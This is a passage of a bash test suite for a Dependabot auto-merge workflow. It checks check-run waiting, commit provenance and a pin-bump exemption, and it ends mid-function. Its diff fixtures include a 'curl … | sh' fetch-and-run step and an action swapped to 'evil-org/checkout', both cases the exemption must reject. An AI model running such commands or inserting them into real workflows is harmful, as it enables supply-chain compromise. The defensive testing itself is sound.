#!/usr/bin/env bash
# tests/test_dependabot_auto_merge_check_wait.sh
#
# Behavioral regression coverage for the Dependabot current-HEAD check wait
# in .github/workflows/dependabot-auto-merge.yml. The PATH-shimmed gh stub
# requires a paginated, GET, form-encoded check-name lookup and models the
# three decisions the embedded shell makes: success, never-seen timeout, and
# seen-but-pending timeout. This complements the structural checks in
# scripts/ci/check_workflow_parsers, which cannot prove the request shape or
# timeout classification.
#
# It also covers the Dependabot commit-provenance wiring: the workflow's
# "Verify Dependabot commit provenance" step and its in-step
# require_dependabot_provenance re-check, both run against a PATH-shimmed gh
# serving the PR commits list (trusted, foreign-commit, unreadable).

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORKFLOW="$ROOT/.github/workflows/dependabot-auto-merge.yml"

[ -r "$WORKFLOW" ] || { echo "missing workflow: $WORKFLOW" >&2; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "SKIP: jq not available" >&2; exit 0; }

PASS=0
FAIL=0
pass() { echo "PASS: $*"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $*" >&2; FAIL=$((FAIL + 1)); }

WORK="$(mktemp -d "${TMPDIR:-/tmp}/dependabot-current-head-check.XXXXXX")"
trap 'rm -rf "$WORK"' EXIT
SHIM_DIR="$WORK/bin"
FUNCTIONS="$WORK/functions.sh"
SHIM_LOG="$WORK/gh.log"
mkdir -p "$SHIM_DIR"

extract_function() {
  local name="$1"
  local file="${2:-$WORKFLOW}"
  # The strip width is derived from the MATCHED header line's own
  # indentation, not hardcoded (#904): a hardcoded `sub(/^          /,
  # "")` (10 spaces) is silently wrong the moment the workflow's `run:
  # |` block indentation changes for any unrelated reason, mis-dedenting
  # every extracted line rather than failing loudly.
  awk -v name="$name" '
    $0 ~ "^[[:space:]]*" name "\\(\\)[[:space:]]*\\{" {
      capture = 1
      match($0, /^[[:space:]]*/)
      indent = RLENGTH
    }
    capture {
      line = $0
      if (length(line) >= indent) line = substr(line, indent + 1)
      print line
    }
    capture && /^[[:space:]]*}[[:space:]]*$/ {
      exit
    }
  ' "$file"
}

{
  extract_function latest_check_run
  printf '\n'
  extract_function require_current_head_check_success
} >"$FUNCTIONS"

if grep -Fq 'latest_check_run()' "$FUNCTIONS" && \
   grep -Fq 'require_current_head_check_success()' "$FUNCTIONS"; then
  pass "extracted the live workflow functions"
else
  fail "could not extract current-head check functions from workflow"
fi

# extract_function's dedent must be DERIVED from the matched header
# line's own indentation, not a value hardcoded to this workflow's
# current `run: |` nesting (#904). Prove it against a fixture indented
# at a DIFFERENT level (4 spaces) than the real workflow (10 spaces): a
# hardcoded strip width would either mis-dedent (leaving stray leading
# spaces) or, if the fixture line is shorter than the hardcoded width,
# eat into the content itself.
INDENT_FIXTURE="$WORK/indent-fixture.yml"
cat >"$INDENT_FIXTURE" <<'FIXTURE'
some:
  unrelated: yaml
    other_function() {
      echo "line one"
      echo "line two"
    }
FIXTURE
indent_extracted="$(extract_function other_function "$INDENT_FIXTURE")"
indent_expected='other_function() {
  echo "line one"
  echo "line two"
}'
if [ "$indent_extracted" = "$indent_expected" ]; then
  pass "extract_function derives the dedent width from the header's own indentation"
else
  fail "extract_function dedent is not indentation-derived; got: $indent_extracted"
fi

cat >"$SHIM_DIR/gh" <<'SHIM'
#!/usr/bin/env bash
set -euo pipefail

printf '%s\n' "$*" >>"$SHIM_LOG"
# Argument-boundary-preserving companion log (#905): $* collapses a
# single argument containing spaces with two adjacent tokens separated
# by a space, so the $*-joined line above cannot by itself prove the
# form-encoded check_name is ONE argv element. This uses a unit
# separator (0x1f) that cannot occur inside a shell argv element to
# record each argument distinctly, one record per invocation.
{ printf '%s\x1f' "$@"; printf '\n'; } >>"${SHIM_LOG}.argv"

require_arg() {
  local expected="$1"
  shift
  local arg
  for arg in "$@"; do
    [ "$arg" = "$expected" ] && return 0
  done
  echo "gh shim: missing expected argument: $expected" >&2
  exit 91
}

case "${1:-}" in
  pr)
    [ "${2:-}" = view ] || { echo "gh shim: unexpected pr command" >&2; exit 92; }
    printf '%s\n' "${FAKE_HEAD:-test-head}"
    ;;
  api)
    shift
    require_arg --paginate "$@"
    require_arg -X "$@"
    require_arg GET "$@"
    require_arg "repos/${GITHUB_REPOSITORY}/commits/${FAKE_HEAD:-test-head}/check-runs" "$@"
    require_arg "check_name=${FAKE_CHECK_NAME:-Label Gate}" "$@"
    require_arg per_page=100 "$@"
    case "${FAKE_MODE:-success}" in
      success)
        cat <<'JSON'
{"check_runs":[{"name":"Label Gate","status":"completed","conclusion":"success","started_at":"2026-08-04T00:01:00Z"},{"name":"Other","status":"completed","conclusion":"failure","started_at":"2026-08-04T00:02:00Z"}]}
{"check_runs":[{"name":"Label Gate","status":"completed","conclusion":"failure","started_at":"2026-08-04T00:00:00Z"}]}
JSON
        ;;
      absent)
        printf '%s\n' '{"check_runs":[]}'
        ;;
      pending)
        printf '%s\n' '{"check_runs":[{"name":"Label Gate","status":"in_progress","conclusion":null,"started_at":"2026-08-04T00:00:00Z"}]}'
        ;;
      *)
        echo "gh shim: unknown FAKE_MODE=${FAKE_MODE:-}" >&2
        exit 93
        ;;
    esac
    ;;
  *)
    echo "gh shim: unexpected command: ${1:-}" >&2
    exit 94
    ;;
esac
SHIM
chmod +x "$SHIM_DIR/gh"

run_functions() {
  local mode="$1"
  local action="$2"
  PATH="$SHIM_DIR:$PATH" \
    SHIM_LOG="$SHIM_LOG" \
    FAKE_MODE="$mode" \
    FAKE_HEAD=test-head \
    FAKE_CHECK_NAME='Label Gate' \
    GITHUB_REPOSITORY=owner/repo \
    PR_URL=https://example.test/owner/repo/pull/1 \
    REQUIRED_HEAD_CHECK_NAME='Label Gate' \
    TEST_CHECK_WAIT_SECONDS=0 \
    TEST_CHECK_POLL_SECONDS=0 \
    bash -c '
      set -euo pipefail
      source "$1"
      case "$2" in
        latest) latest_check_run "Label Gate" test-head ;;
        gate) require_current_head_check_success ;;
      esac
    ' bash "$FUNCTIONS" "$action"
}

: >"$SHIM_LOG"
: >"${SHIM_LOG}.argv"
if latest_output="$(run_functions success latest)"; then
  if [ "$(printf '%s' "$latest_output" | jq -c '{name,status,conclusion}')" = '{"name":"Label Gate","status":"completed","conclusion":"success"}' ]; then
    pass "paginated filtered lookup selects the latest exact-name run"
  else
    fail "latest lookup returned the wrong run: $latest_output"
  fi
else
  fail "paginated filtered lookup failed"
fi

# This checks the OVERALL invocation shape and ordering via the $*-joined
# log line. $* alone would collapse a single argument containing spaces
# (e.g. `check_name=Label Gate` as one token) with two adjacent tokens
# that happen to be separated by a space, so it cannot by itself prove
# which one occurred — it is redundant/weaker coverage of flag order,
# not of the argument boundary (#905).
if grep -Fq -- '--paginate -X GET repos/owner/repo/commits/test-head/check-runs -f check_name=Label Gate -F per_page=100' "$SHIM_LOG"; then
  pass "lookup's overall invocation shape matches the expected flag order"
else
  fail "lookup did not use the required paginated, form-encoded request shape"
fi

# The actual argument-boundary proof (#905): read the 0x1f-delimited argv
# record and confirm `check_name=Label Gate` arrived as exactly ONE argv
# element, not two adjacent elements ("check_name=Label" and "Gate")
# that a $*-join would render identically. require_arg's "$@" walk above
# already enforces this at runtime; this reads back the same evidence
# independently of $*.
argv_record="$(tail -n1 "${SHIM_LOG}.argv")"
argv_field_count=0
argv_has_exact_token=0
IFS=$'\x1f' read -r -a argv_fields <<<"$argv_record"
for argv_field in "${argv_fields[@]}"; do
  [ -n "$argv_field" ] || continue
  argv_field_count=$((argv_field_count + 1))
  [ "$argv_field" = "check_name=Label Gate" ] && argv_has_exact_token=1
done
if [ "$argv_has_exact_token" -eq 1 ]; then
  pass "check_name=Label Gate arrived as a single argv element, not two adjacent tokens"
else
  fail "check_name=Label Gate did not arrive as a single argv element (argv: $argv_record)"
fi

if success_output="$(run_functions success gate 2>&1)"; then
  if [[ "$success_output" == *"Required check run 'Label Gate' is successful on current HEAD test-head."* ]]; then
    pass "successful latest run clears the current-head wait"
  else
    fail "success path emitted an unexpected result: $success_output"
  fi
else
  fail "successful latest run did not clear the current-head wait"
fi

set +e
absent_output="$(run_functions absent gate 2>&1)"
absent_rc=$?
set -e
if [ "$absent_rc" -ne 0 ] && \
   [[ "$absent_output" == *"never appeared on current HEAD test-head"* ]] && \
   [[ "$absent_output" == *"Compare against: gh api -X GET repos/owner/repo/commits/test-head/check-runs --paginate"* ]]; then
  pass "absent check takes the never-seen timeout path"
else
  fail "absent timeout was misclassified (rc=$absent_rc): $absent_output"
fi

set +e
pending_output="$(run_functions pending gate 2>&1)"
pending_rc=$?
set -e
if [ "$pending_rc" -ne 0 ] && \
   [[ "$pending_output" == *"did not complete successfully within 0s on current HEAD test-head"* ]] && \
   [[ "$pending_output" != *"never appeared"* ]]; then
  pass "seen pending check takes the completion timeout path"
else
  fail "pending timeout was misclassified (rc=$pending_rc): $pending_output"
fi

# ---------------------------------------------------------------------------
# Dependabot commit provenance. The job-level `if:` trusts the PR opener and
# fetch-metadata reads only the first commit, so the workflow must refuse to
# approve or merge unless EVERY commit on the PR is Dependabot-produced.
# ---------------------------------------------------------------------------
PROV_DIR="$WORK/prov"
mkdir -p "$PROV_DIR/bin"
PROV_HEAD=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
PROV_OLD=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
cat >"$PROV_DIR/bin/gh" <<'SHIM'
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$*" >>"$PROV_LOG"
case "$1 ${2:-}" in
  "api --paginate")
    case "$3" in
      repos/owner/repo/pulls/1/commits\?per_page=100)
        [ "${PROV_MODE:-}" != unreadable ] || { echo "HTTP 502" >&2; exit 1; }
        [ "${PROV_MODE:-}" != nonarray ] || { echo '{"message":"Bad credentials"}'; exit 0; }
        cat "$PROV_COMMITS"
        ;;
      *) echo "gh shim: unexpected api endpoint: $3" >&2; exit 91 ;;
    esac
    ;;
  "pr view")
    printf '%s\n' "${PROV_ARMED:-false}"
    ;;
  "pr merge")
    [ "${3:-}" = "--disable-auto" ] || { echo "gh shim: unexpected merge: $*" >&2; exit 92; }
    ;;
  *) echo "gh shim: unexpected command: $*" >&2; exit 93 ;;
esac
SHIM
chmod +x "$PROV_DIR/bin/gh"

prov_commit() {  # <sha> <author> <committer> <verified>
  jq -nc --arg sha "$1" --arg a "$2" --arg c "$3" --argjson v "$4" \
    '{sha:$sha, author:{login:$a}, committer:{login:$c}, commit:{verification:{verified:$v}}}'
}
printf '[%s]\n' "$(prov_commit "$PROV_HEAD" 'dependabot[bot]' web-flow true)" >"$PROV_DIR/trusted.json"
printf '[%s,%s]\n' "$(prov_commit "$PROV_OLD" 'dependabot[bot]' web-flow true)" \
  "$(prov_commit "$PROV_HEAD" someone-with-push someone-with-push false)" >"$PROV_DIR/foreign.json"

# Extract the provenance step's `run: |` body, dedented by its own indent.
awk '
  /- name: Verify Dependabot commit provenance/ { in_step = 1; next }
  in_step && /^[[:space:]]*run: \|[[:space:]]*$/ { in_run = 1; indent = -1; next }
  in_run && /^[[:space:]]*env:[[:space:]]*$/ { exit }
  in_run {
    if (indent < 0 && $0 ~ /[^[:space:]]/) { match($0, /^[[:space:]]*/); indent = RLENGTH }
    print (length($0) >= indent ? substr($0, indent + 1) : "")
  }
' "$WORKFLOW" >"$PROV_DIR/step.sh"

run_prov_step() {  # <commits_file> <mode> <armed>
  : >"$PROV_DIR/gh.log"
  : >"$PROV_DIR/output"
  ( cd "$ROOT" && PATH="$PROV_DIR/bin:$PATH" PROV_LOG="$PROV_DIR/gh.log" \
      PROV_COMMITS="$1" PROV_MODE="$2" PROV_ARMED="$3" \
      GITHUB_OUTPUT="$PROV_DIR/output" GITHUB_REPOSITORY=owner/repo \
      PR_URL=https://example.test/owner/repo/pull/1 PR_NUMBER=1 PR_HEAD_SHA="$PROV_HEAD" \
      bash "$PROV_DIR/step.sh" )
}

if grep -Fq 'dependabot_commit_provenance "$GITHUB_REPOSITORY" "$PR_NUMBER" "$PR_HEAD_SHA"' "$PROV_DIR/step.sh"; then
  pass "extracted the live provenance step"
else
  fail "could not extract the provenance step from the workflow"
fi

set +e
out=$(run_prov_step "$PROV_DIR/trusted.json" ok false 2>&1); rc=$?
set -e
if [ "$rc" -eq 0 ] && grep -Fxq 'trusted=true' "$PROV_DIR/output"; then
  pass "provenance step: Dependabot-only commits → trusted=true"
else
  fail "provenance step: trusted case rc=$rc output=$(cat "$PROV_DIR/output"): $out"
fi

set +e
out=$(run_prov_step "$PROV_DIR/foreign.json" ok true 2>&1); rc=$?
set -e
if [ "$rc" -eq 0 ] && grep -Fxq 'trusted=false' "$PROV_DIR/output" \
   && grep -Fq 'pr merge --disable-auto' "$PROV_DIR/gh.log" \
   && [[ "$out" == *"not Dependabot-only"* ]]; then
  pass "provenance step: foreign commit → trusted=false and an armed auto-merge is withdrawn"
else
  fail "provenance step: foreign case rc=$rc output=$(cat "$PROV_DIR/output") log=$(cat "$PROV_DIR/gh.log"): $out"
fi

set +e
out=$(run_prov_step "$PROV_DIR/foreign.json" ok false 2>&1); rc=$?
set -e
if [ "$rc" -eq 0 ] && grep -Fxq 'trusted=false' "$PROV_DIR/output" \
   && ! grep -Fq 'pr merge' "$PROV_DIR/gh.log"; then
  pass "provenance step: foreign commit, nothing armed → trusted=false, no merge call"
else
  fail "provenance step: foreign/unarmed case rc=$rc log=$(cat "$PROV_DIR/gh.log"): $out"
fi

# #2554: the reason gh_api_array composed must reach the step's ::error::
# line. It used to be lost across `commits=$(gh_api_array …)`, so every
# failed read logged the generic `failed to read PR commits` and the
# operator could not tell an API error from a budget or output refusal.
set +e
out=$(run_prov_step "$PROV_DIR/trusted.json" unreadable false 2>&1); rc=$?
set -e
if [ "$rc" -ne 0 ] && grep -Fxq 'trusted=false' "$PROV_DIR/output" \
   && [[ "$out" == *"Could not verify Dependabot commit provenance on $PROV_HEAD: failed to fetch PR commits: HTTP 502. Refusing auto-merge."* ]] \
   && [[ "$out" != *"failed to read PR commits"* ]]; then
  pass "provenance step: unreadable commits → job fails, trusted=false, and the error names gh's reason"
else
  fail "provenance step: unreadable case rc=$rc output=$(cat "$PROV_DIR/output"): $out"
fi

set +e
out=$(run_prov_step "$PROV_DIR/trusted.json" nonarray false 2>&1); rc=$?
set -e
if [ "$rc" -ne 0 ] && grep -Fxq 'trusted=false' "$PROV_DIR/output" \
   && [[ "$out" == *"PR commits (repos/owner/repo/pulls/1/commits?per_page=100) came back as a stream of object values"* ]] \
   && [[ "$out" != *"failed to read PR commits"* ]]; then
  pass "provenance step: a 200 that is not a list → job fails, trusted=false, and the error names the shape"
else
  fail "provenance step: non-list case rc=$rc output=$(cat "$PROV_DIR/output"): $out"
fi

# The in-step re-check that guards the approve and both merge paths.
extract_function require_dependabot_provenance >"$PROV_DIR/recheck.sh"
run_recheck() {  # <commits_file> <mode> [armed]
  ( cd "$ROOT" && PATH="$PROV_DIR/bin:$PATH" PROV_LOG="$PROV_DIR/gh.log" \
      PROV_COMMITS="$1" PROV_MODE="$2" PROV_ARMED="${3:-false}" GITHUB_REPOSITORY=owner/repo PR_NUMBER=1 \
      PR_URL=https://example.test/owner/repo/pull/1 \
      bash -c 'set -euo pipefail
        . scripts/lib/gh-api-array.sh
        . scripts/lib/dependabot-commit-provenance.sh
        . "$1"
        require_dependabot_provenance "$2"
        echo REACHED_ACTION' bash "$PROV_DIR/recheck.sh" "$PROV_HEAD" )
}
set +e
out_t=$(run_recheck "$PROV_DIR/trusted.json" ok 2>&1); rc_t=$?
: >"$PROV_DIR/gh.log"
out_f=$(run_recheck "$PROV_DIR/foreign.json" ok true 2>&1); rc_f=$?
withdrew_f=$(grep -c 'pr merge --disable-auto' "$PROV_DIR/gh.log" || true)
out_u=$(run_recheck "$PROV_DIR/trusted.json" unreadable 2>&1); rc_u=$?
set -e
if [ "$rc_t" -eq 0 ] && [[ "$out_t" == *REACHED_ACTION* ]] \
   && [ "$rc_f" -eq 0 ] && [[ "$out_f" != *REACHED_ACTION* ]] && [ "$withdrew_f" -eq 1 ] \
   && [ "$rc_u" -ne 0 ] && [[ "$out_u" != *REACHED_ACTION* ]] \
   && [[ "$out_u" == *"failed to fetch PR commits: HTTP 502"* ]]; then
  pass "require_dependabot_provenance: trusted proceeds; foreign withdraws an armed auto-merge and stops cleanly; unreadable fails naming gh's reason"
else
  fail "require_dependabot_provenance: t=$rc_t/$out_t f=$rc_f/$out_f u=$rc_u/$out_u"
fi

# The helper's own rc-3 contract (#2554): a failed read returns 3, writes
# NOTHING to stdout, and reports gh_api_array's diagnostic verbatim. The
# helper's stdout is captured to a file, not a command substitution, so the
# REASON global is read in the same shell that set it.
run_prov_helper() {  # <commits_file> <mode> [tmpdir] [helper_path]
  ( cd "$ROOT" && PATH="$PROV_DIR/bin:$PATH" PROV_LOG="$PROV_DIR/gh.log" \
      PROV_COMMITS="$1" PROV_MODE="$2" TMPDIR="${3:-${TMPDIR:-/tmp}}" \
      bash -c 'set -uo pipefail
        . scripts/lib/gh-api-array.sh
        . "$2"
        rc=0
        dependabot_commit_provenance owner/repo 1 "$1" >"$3" || rc=$?
        printf "rc=%s\nstdout=%s\nreason=%s\n" "$rc" "$(cat "$3")" "$DEPENDABOT_PROVENANCE_REASON"' \
      bash "$PROV_HEAD" "${4:-scripts/lib/dependabot-commit-provenance.sh}" "$PROV_DIR/helper.stdout" )
}
helper_field() { printf '%s\n' "$1" | sed -n "s/^$2=//p"; }

set +e
res_fetch=$(run_prov_helper "$PROV_DIR/trusted.json" unreadable)
res_shape=$(run_prov_helper "$PROV_DIR/trusted.json" nonarray)
set -e
if [ "$(helper_field "$res_fetch" rc)" = 3 ] && [ -z "$(helper_field "$res_fetch" stdout)" ] \
   && [ "$(helper_field "$res_fetch" reason)" = "failed to fetch PR commits: HTTP 502" ] \
   && [ "$(helper_field "$res_shape" rc)" = 3 ] && [ -z "$(helper_field "$res_shape" stdout)" ] \
   && [[ "$(helper_field "$res_shape" reason)" == "PR commits (repos/owner/repo/pulls/1/commits?per_page=100) came back as a stream of object values"* ]]; then
  pass "dependabot_commit_provenance: a failed read returns 3 with nothing on stdout and gh_api_array's fetch or shape diagnostic as the reason"
else
  fail "dependabot_commit_provenance: rc-3 contract: fetch=[$res_fetch] shape=[$res_shape]"
fi

# Temporary storage costs the diagnostic, never the verdict: with no scratch
# directory the helper still judges the commits, and a failed read says the
# cause was not captured rather than claiming one.
set +e
res_notmp_ok=$(run_prov_helper "$PROV_DIR/trusted.json" ok "$PROV_DIR/no-such-tmpdir")
res_notmp_fail=$(run_prov_helper "$PROV_DIR/trusted.json" unreadable "$PROV_DIR/no-such-tmpdir")
set -e
if [ "$(helper_field "$res_notmp_ok" rc)" = 0 ] \
   && [[ "$(helper_field "$res_notmp_ok" reason)" == *"signature verified"* ]] \
   && [ "$(helper_field "$res_notmp_fail" rc)" = 3 ] && [ -z "$(helper_field "$res_notmp_fail" stdout)" ] \
   && [ "$(helper_field "$res_notmp_fail" reason)" = "failed to read PR commits (reason not captured: mktemp unavailable)" ]; then
  pass "dependabot_commit_provenance: without a scratch directory the verdict still stands and a failed read says the reason was not captured"
else
  fail "dependabot_commit_provenance: no-tmpdir contract: ok=[$res_notmp_ok] fail=[$res_notmp_fail]"
fi

# Mutation check: put the command substitution back in a scratch copy of
# the helper and confirm the fetch assertion above would catch it — the
# reason must degrade to the generic fallback, which is the defect. The sed
# is verified to have changed the copy, so a no-op rewrite cannot pass this
# vacuously.
MUTANT="$PROV_DIR/provenance-mutant.sh"
# shellcheck disable=SC2016  # the sed pattern and the grep below quote the helper's own source text
sed 's|gh_api_array "$endpoint" "PR commits" >"$commits_tmp"|commits=$(gh_api_array "$endpoint" "PR commits")|' \
  "$ROOT/scripts/lib/dependabot-commit-provenance.sh" >"$MUTANT"
set +e
res_mutant=$(run_prov_helper "$PROV_DIR/trusted.json" unreadable "" "$MUTANT")
set -e
# shellcheck disable=SC2016  # literal source text, see above
if grep -Fq 'if ! commits=$(gh_api_array "$endpoint" "PR commits"); then' "$MUTANT" \
   && ! cmp -s "$MUTANT" "$ROOT/scripts/lib/dependabot-commit-provenance.sh" \
   && [ "$(helper_field "$res_mutant" rc)" = 3 ] \
   && [ "$(helper_field "$res_mutant" reason)" = "failed to read PR commits" ]; then
  pass "mutation: restoring commits=\$(gh_api_array …) loses the reason to the generic fallback, so the assertion above discriminates"
else
  fail "mutation: expected the substitution form to degrade the reason; got [$res_mutant]"
fi

# Ordering: the approve is bound to a verified SHA, and each merge path
# re-verifies the SHA it is pinned to.
approve_block=$(awk '/HEAD_AND_BASE=\$\(gh pr view/{p=1} p{print} /event=APPROVE/{exit}' "$WORKFLOW")
if [[ "$approve_block" == *'require_dependabot_provenance "$APPROVE_SHA"'* ]] \
   && [[ "$approve_block" == *'-f commit_id="$APPROVE_SHA"'* ]] \
   && ! grep -Fq 'gh pr review --approve' "$WORKFLOW"; then
  pass "approve is pinned to a provenance-verified commit_id"
else
  fail "approve must verify provenance and bind commit_id to the verified SHA"
fi
recheck_before_merge=$(awk '
  /^[[:space:]]*require_current_head_checks_success[[:space:]]*$/ { getline nxt; if (nxt ~ /require_dependabot_provenance "\$CURRENT_HEAD_SHA"/) n++ }
  END { print n + 0 }' "$WORKFLOW")
if [ "$recheck_before_merge" -ge 2 ] \
   && grep -Fq "steps.provenance.outputs.trusted == 'true'" "$WORKFLOW"; then
  pass "both merge paths re-verify provenance on the pinned head; approve step gated on trusted"
else
  fail "expected provenance re-check after each head pin (got $recheck_before_merge) and a trusted-gated approve step"
fi

# ---------------------------------------------------------------------------
# Dependabot action-pin bump lane (#2164): the ONE predicate behind the
# `.github/**` protected-path carve-out, scripts/workflow/
# dependabot_pin_bump_exemption.sh, driven against a PATH-shimmed gh serving
# the live PR object, the PR commits list and the PR files list. Both
# directions are covered: a provenance-verified, pin-only diff is exempt; a
# non-pin hunk, a non-workflow file, a non-Dependabot author, a foreign commit,
# an unreadable read, a head move, or a payload not bound to the pinned head is
# not.
# ---------------------------------------------------------------------------
PIN_HELPER="${PIN_HELPER:-$ROOT/scripts/workflow/dependabot_pin_bump_exemption.sh}"
PIN_DIR="$WORK/pin"
mkdir -p "$PIN_DIR/bin"
PIN_HEAD=cccccccccccccccccccccccccccccccccccccccc
PIN_BASE=dddddddddddddddddddddddddddddddddddddddd
PIN_OTHER=eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee

if [ -x "$PIN_HELPER" ]; then
  pass "pin-bump exemption helper is present and executable"
else
  fail "missing or non-executable helper: $PIN_HELPER"
fi

cat >"$PIN_DIR/bin/gh" <<'SHIM'
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$*" >>"$PIN_LOG"
case "$1 ${2:-}" in
  "api --paginate")
    case "$3" in
      repos/owner/repo/pulls/1/commits\?per_page=100)
        [ "${PIN_MODE:-}" != unreadable-commits ] || { echo "HTTP 502" >&2; exit 1; }
        cat "$PIN_COMMITS"
        ;;
      repos/owner/repo/pulls/1/files\?per_page=100)
        [ "${PIN_MODE:-}" != unreadable-files ] || { echo "HTTP 502" >&2; exit 1; }
        cat "$PIN_FILES"
        ;;
      *) echo "gh shim: unexpected paginated endpoint: $3" >&2; exit 91 ;;
    esac
    ;;
  "api repos/owner/repo/pulls/1")
    [ "${PIN_MODE:-}" != pr-read-fails ] || { echo "HTTP 500" >&2; exit 1; }
    reads=$(grep -c '^api repos/owner/repo/pulls/1$' "$PIN_LOG" || true)
    if [ "${PIN_MODE:-}" = head-moves ] && [ "$reads" -ge 2 ]; then
      cat "$PIN_PR_MOVED"
    else
      cat "$PIN_PR"
    fi
    ;;
  *) echo "gh shim: unexpected command: $*" >&2; exit 93 ;;
esac
SHIM
chmod +x "$PIN_DIR/bin/gh"
# Fault the actual matcher's child process, including partial stdout, without
# replacing the exemption helper's proof or changing its production interface.
cat >"$PIN_DIR/bin/bash" <<'SHIM'
#!/bin/bash
case "${1:-}" in
  */match_protected_paths.sh)
    case "${PIN_MODE:-}" in
      matcher-fails) exit 43 ;;
      matcher-partial-fails) printf '%s\n' .github/workflows/deploy.yml; exit 43 ;;
    esac
    ;;
esac
exec /bin/bash "$@"
SHIM
chmod +x "$PIN_DIR/bin/bash"

pin_pr_json() {  # <author> <head> <base>
  jq -nc --arg a "$1" --arg h "$2" --arg b "$3" '{user:{login:$a}, head:{sha:$h}, base:{sha:$b}}'
}
pin_pr_json 'dependabot[bot]' "$PIN_HEAD" "$PIN_BASE" >"$PIN_DIR/pr.json"
pin_pr_json 'dependabot[bot]' "$PIN_OTHER" "$PIN_BASE" >"$PIN_DIR/pr-moved.json"
pin_pr_json 'someone-with-push' "$PIN_HEAD" "$PIN_BASE" >"$PIN_DIR/pr-human.json"
pin_pr_json 'dependabot-lookalike' "$PIN_HEAD" "$PIN_BASE" >"$PIN_DIR/pr-lookalike.json"
printf '[%s]\n' "$(prov_commit "$PIN_HEAD" 'dependabot[bot]' web-flow true)" >"$PIN_DIR/commits-trusted.json"
printf '[%s,%s]\n' "$(prov_commit "$PIN_OTHER" 'dependabot[bot]' web-flow true)" \
  "$(prov_commit "$PIN_HEAD" someone-with-push someone-with-push false)" >"$PIN_DIR/commits-foreign.json"

# One PR files entry. The contents_url ref is what binds a files payload to
# the pinned head, so the builder takes the ref explicitly.
pin_file() {  # <filename> <patch> <additions> <deletions> [status] [ref] [previous_filename]
  jq -nc --arg f "$1" --arg p "$2" --argjson a "$3" --argjson d "$4" \
    --arg s "${5:-modified}" --arg ref "${6:-$PIN_HEAD}" --arg prev "${7:-}" '
    {filename:$f, status:$s, additions:$a, deletions:$d, changes:($a+$d), patch:$p,
     contents_url:("https://api.github.com/repos/owner/repo/contents/" + ($f | @uri) + "?ref=" + $ref)}
    | if $prev != "" then . + {previous_filename:$prev} else . end'
}

# The real #2133 diff: one SHA-pinned action bump with its pin comment.
PATCH_REAL='@@ -356,7 +356,7 @@ jobs:

       - name: Download the inert read-only handoff
         if: steps.source.outputs.requires_relay == '"'"'true'"'"' && steps.artifact.outputs.found == '"'"'true'"'"'
-        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c  # v8.0.1
+        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333  # v8.0.2
         with:
           name: codex-p1-read-only-handoff-${{ steps.source.outputs.pr }}
           path: ${{ runner.temp }}/codex-p1-read-only-handoff'
# Two pins in one hunk, one of them the `- uses:` list-item form and a tag pin.
PATCH_TWO='@@ -10,6 +10,6 @@ jobs:
     steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.2
         with:
           persist-credentials: false
-      - uses: actions/setup-node@v4
+      - uses: actions/setup-node@v5
       - run: npm ci'
# A pin bump plus a new step in the same hunk.
PATCH_NEW_STEP='@@ -10,4 +10,5 @@ jobs:
     steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.2
+      - run: curl -sSf https://example.invalid/install.sh | sh
         with:
           persist-credentials: false'
# Balanced at the file level (two additions, two deletions) but not within a
# hunk: a pin bump plus a new step in one hunk, a deleted step in another.
PATCH_UNBALANCED='@@ -10,3 +10,4 @@ jobs:
     steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.2
+      - run: curl -sSf https://example.invalid/install.sh | sh
         with:
@@ -30,3 +31,2 @@ jobs:
       - run: npm ci
-      - run: npm test
       - run: npm run lint'
# The uses: target itself changes, not only its pin.
PATCH_TARGET='@@ -10,3 +10,3 @@ jobs:
     steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: evil-org/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.1
         with:'
# A one-for-one line replacement that is not a pin line at all.
PATCH_WITH='@@ -12,3 +12,3 @@ jobs:
         with:
-          persist-credentials: false
+          persist-credentials: true
       - run: npm ci'
# A permissions block (one-for-one, so additions == deletions) is not a pin.
PATCH_PERMISSIONS='@@ -3,3 +3,3 @@ on:
 permissions:
-  contents: read
+  contents: write
 jobs:'
# The pin line moves to a different indentation: text before `@` differs.
PATCH_INDENT='@@ -10,3 +10,3 @@ jobs:
     steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.2
         with:'
# A pin bump on the last line of a file that gains its trailing newline.
PATCH_EOF='@@ -30,2 +30,2 @@ jobs:
       - name: Tail
-        uses: actions/cache@0400d5f644dc74513175e3cd8d07132dd4860809 # v4.2.0
\ No newline at end of file
+        uses: actions/cache@d4323d4df104b026a6aa633fdb11d772146be0bf # v4.2.2'

pin_files() {  # <entry json>... -> array file
  printf '%s\n' "$@" | jq -sc '.'
}

run_pin() {  # <pr json> <commits json> <files json|-> <mode> [extra helper args...]
  local pr=$1 commits=$2 files=$3 mode=$4
  shift 4
  : >"$PIN_DIR/gh.log"
  local files_arg=()
  if [ "$files" != - ]; then
    files_arg=(--files-json "$files")
  fi
  ( cd "$ROOT" && PATH="$PIN_DIR/bin:$PATH" PIN_LOG="$PIN_DIR/gh.log" \
      PIN_PR="$pr" PIN_PR_MOVED="$PIN_DIR/pr-moved.json" PIN_COMMITS="$commits" \
